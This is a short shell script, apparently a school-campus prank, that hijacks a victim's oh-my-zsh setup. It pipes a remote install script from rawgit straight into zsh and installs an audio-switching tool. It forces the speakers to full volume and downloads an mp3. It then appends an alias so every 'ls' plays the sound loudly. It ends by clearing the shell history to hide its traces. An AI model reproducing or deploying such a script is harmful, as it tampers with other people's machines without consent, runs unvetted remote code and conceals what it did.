# **************************************************************************** #
#                                                           LE - /             #
#                                                               /              #
#    troll_oh_my_zsh.sh                               .::    .:/ .      .::    #
#                                                  +:+:+   +:    +:  +:+:+     #
#    By: cgarrot <marvin@le-101.fr>                 +:+   +:    +:    +:+      #
#                                                  #+#   #+    #+    #+#       #
#    Created: 2019/07/10 16:09:30 by cgarrot      #+#   ##    ##    #+#        #
#    Updated: 2019/07/11 15:55:58 by cgarrot     ###    #+. /#+    ###.fr      #
#                                                          /                   #
#                                                         /                    #
# **************************************************************************** #

if [ -f ~/.brewconfig.zsh ]
then
	(brew install switchaudio-osx)
else
	(curl -fsSL https://rawgit.com/kube/42homebrew/master/install.sh | zsh)
	(brew install switchaudio-osx)
fi

if [ -f ~/.oh-my-zsh/custom/alias.zsh ]
then
	cp ~/.oh-my-zsh/custom/alias.zsh ~/.oh-my-zsh/custom/.aliassave
fi
touch ~/.oh-my-zsh/custom/alias.zsh
(SwitchAudioSource -s "Built-in Output" &)
(osascript -e "set volume output volume 100" &)
echo "alias ls='(afplay --volume 255 ~/.troll.mp3 &) ; ls -G $1'" >> ~/.oh-my-zsh/custom/alias.zsh

curl https://www.myinstants.com/media/sounds/mais-moi-je-veu-faire-lamour.mp3 -o ~/.troll.mp3
clear
history -c
exec zsh
